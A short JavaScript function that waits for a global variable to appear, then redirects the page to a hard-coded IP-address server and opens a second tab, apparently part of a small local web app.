function waitForElement(){
    if(typeof done_var !== "undefined"){
        window.location.href = "http://52.201.219.127:8000/"; 
        window.open("http://http://52.201.219.127:8000/redirect/", '_blank');
    }
    else{
        setTimeout(waitForElement, 250);
    }
}

/*

http://127.0.0.1:8000/
    
*/
